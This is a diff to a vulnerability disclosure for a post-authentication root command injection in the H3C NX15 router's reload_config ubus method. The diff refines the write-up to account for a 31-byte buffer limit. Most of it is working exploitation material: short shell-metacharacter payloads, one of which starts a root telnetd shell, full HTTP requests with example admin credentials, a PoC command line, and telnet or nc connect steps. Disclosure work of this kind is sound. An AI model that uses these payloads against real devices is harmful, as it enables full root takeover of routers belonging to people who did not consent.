@@ -25,7 +25,7 @@ H3C NX15 Router firmware NX15V100R017 exposes the raw ubus object `reload` throu
 
 ## Impact
 
-An authenticated attacker can execute arbitrary commands as root. Runtime testing confirmed that a crafted `config` value can start a temporary shell service and execute commands with UID 0.
+An authenticated attacker can execute arbitrary commands as root. Runtime testing on the physical device confirmed that a crafted short `config` value can create a marker file and start a temporary shell service that runs with UID 0.
 
 ## Technical Details
 
@@ -43,16 +43,20 @@ method
 status
 ```
 
-Reverse analysis of the method handler shows that the `config` parameter is copied into a local buffer and later used to build a shell command:
+Reverse analysis of the method handler shows that the `config` parameter is copied into a local fixed-size buffer and later used to build a shell command:
 
 ```c
+strncpy(config, config_ptr, 0x1f);
 sprintf(cmd, "/sbin/config_reload %s", config);
 system(cmd);
 ```
+![alt text](imag/image-3.png)
 
-There is no strict allowlist, shell escaping, or metacharacter filtering before `system()` is called. Therefore, shell separators or command-substitution syntax in `config` can escape the intended `/sbin/config_reload <config>` call.
+This detail matters for exploitation: the runtime buffer keeps at most 31 attacker-controlled bytes before the final `sprintf()` and `system()` call. As a result, the direct injection is real, but payloads must remain short. Long combined payloads that try to create a marker and start a shell in one request may be truncated before the shell sees the full command line.
 
-The `status` parameter controls whether the reload is executed immediately or queued asynchronously. In the immediate path, the vulnerable command construction reaches `system()` directly.
+There is no strict allowlist, shell escaping, or metacharacter filtering before `system()` is called. Therefore, shell separators or command-substitution syntax in `config` can escape the intended `/sbin/config_reload <config>` call, provided the attacker keeps the injected string within the effective 31-byte limit.
+
+The `status` parameter controls whether the reload is executed immediately or queued asynchronously. In the immediate path (`status=1`), the vulnerable command construction reaches `system()` directly. The queued path (`status=0`) also reaches `/sbin/config_reload`, but the immediate path is the clearest and most reliable validation path on the tested device.
 
 This issue is separate from the configuration-pollution chain documented elsewhere in the project. Here, the `config` field itself is the injection point. The attack path is:
 
@@ -96,15 +100,15 @@ python3 poc/postauth_reload_reload_config_rce.py \
   --base http://192.168.8.1 \
   --username admin \
   --password '<admin-password>' \
-  --port 2345
+  --port 2501
 ```
 
 The PoC:
 
 1. Authenticates to the web interface.
 2. Calls `/api/esps` with object `reload` and method `reload_config`.
-3. Sends a crafted `config` value containing shell metacharacters.
-4. Starts a temporary shell service.
+3. Sends a short crafted `config` value containing shell metacharacters.
+4. Starts a temporary shell service within the observed 31-byte buffer limit.
 5. Connects to the shell and verifies root execution.
 
 Expected result:
@@ -130,7 +134,9 @@ Manual request shape:
 ]
 ```
 
-A concrete exploit-style example is:
+Because `config` is truncated to 31 bytes before the final command is built, validation should be split into two stages.
+
+Marker-only validation request:
 
 ```json
 [
@@ -139,7 +145,7 @@ A concrete exploit-style example is:
     "object": "reload",
     "method": "reload_config",
     "param": {
-      "config": "x;echo RELOAD_RCE_OK>/tmp/reload_rce_marker;telnetd -p2345 -l /bin/sh;#",
+      "config": "x;echo OK>/tmp/r;#",
       "method": "reload",
       "status": 1
     }
@@ -147,7 +153,24 @@ A concrete exploit-style example is:
 ]
 ```
 
-After the request returns, connect to `telnet 192.168.8.1 2345` and run `id`.
+Short shell-spawn validation request:
+
+```json
+[
+  {
+    "id": 1,
+    "object": "reload",
+    "method": "reload_config",
+    "param": {
+      "config": "x;telnetd -p2501 -l/bin/sh;#",
+      "method": "reload",
+      "status": 1
+    }
+  }
+]
+```
+
+After the shell-spawn request returns, connect to `telnet 192.168.8.1 2501` and run `id`.
 
 BurpSuite step-by-step reproduction:
 
@@ -163,8 +186,8 @@ Connection: close
 
 {"username":"admin","password":"admin123"}
 ```
-
-2. Extract `data.session` and send:
+![alt text](imag/image-1.png)
+2. Extract `data.session` and send the short marker-only validation request:
 
 ```http
 POST /api/esps HTTP/1.1
@@ -175,37 +198,60 @@ Content-Type: application/json
 AUTHENTICATION: <SESSION>
 Connection: close
 
-[{"id":1,"object":"reload","method":"reload_config","param":{"config":"x;echo RELOAD_RCE_OK>/tmp/reload_rce_marker;telnetd -p2345 -l /bin/sh;#","method":"reload","status":1}}]
+[{"id":1,"object":"reload","method":"reload_config","param":{"config":"x;echo OK>/tmp/r;#","method":"reload","status":1}}]
+```
+![alt text](imag/image-4.png)
+3. Confirm the marker through any existing helper shell or other verified execution channel:
+
+```sh
+ls -l /tmp/r
+cat /tmp/r
+```
+![alt text](imag/image-5.png)
+4. Then send the short shell-spawn request:
+
+```http
+POST /api/esps HTTP/1.1
+Host: 192.168.8.1
+User-Agent: Mozilla/5.0
+Accept: application/json, text/plain, */*
+Content-Type: application/json
+AUTHENTICATION: <SESSION>
+Connection: close
+
+[{"id":1,"object":"reload","method":"reload_config","param":{"config":"x;telnetd -p2501 -l/bin/sh;#","method":"reload","status":1}}]
 ```
 
-3. Wait briefly and connect:
+5. Wait briefly and connect:
 
 ```bash
-telnet 192.168.8.1 2345
+telnet 192.168.8.1 2501
 ```
 
 or:
 
 ```bash
-nc 192.168.8.1 2345
+nc 192.168.8.1 2501
 ```
 
-4. Run:
+6. Run:
 
 ```sh
 id
 uname -a
-cat /tmp/reload_rce_marker
 ```
-
-5. The same request can also be tested with `"status":0`, but `status=1` is the most direct validation path.
+![alt text](imag/image-6.png)
+7. The same object can also be exercised with `"status":0`, but on the tested physical device `status=1` was the reliable path for short direct-injection validation.
 
 ## Evidence
 
 - The Lua `magic_link` layer allows authenticated `/api/esps` callers to target raw ubus object `reload` directly.
 - Static analysis of `/usr/bin/reload` exposed the `reload_config` parameter names and `/sbin/config_reload %s` command template.
-- Reverse analysis identified `sprintf("/sbin/config_reload %s", config)` followed by `system(cmd)`.
-- Runtime verification confirmed that a crafted `config` value executes commands as root.
+- Reverse analysis identified `strncpy(config, config_ptr, 0x1f)` followed by `sprintf("/sbin/config_reload %s", config)` and `system(cmd)`.
+- Runtime verification on the physical device confirmed:
+  - a short marker-only payload (`x;echo OK>/tmp/r;#`) executes successfully with `status=1`;
+  - a short shell-spawn payload (`x;telnetd -p2501 -l/bin/sh;#`) successfully opens a root shell;
+  - longer combined payloads can fail because the attacker-controlled `config` string is truncated before command execution.
 
 ## Attachments
 
